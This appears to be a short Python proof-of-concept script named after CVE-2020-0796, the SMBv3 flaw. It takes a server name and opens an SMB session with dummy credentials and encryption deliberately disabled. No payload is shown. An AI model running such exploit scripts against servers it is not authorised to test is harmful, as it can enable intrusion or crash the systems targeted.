#!/usr/bin/env python3

from smbclient import (
    link,
    open_file,
    remove,
    register_session,
    stat,
    symlink,
)

import sys

if len(sys.argv) < 2:
    print("usage: ./CVE-2020-0796.py servername")
    sys.exit(1)

register_session(sys.argv[1], username="fakeusername", 
    password="password", encrypt=False) # encryption must be disabled
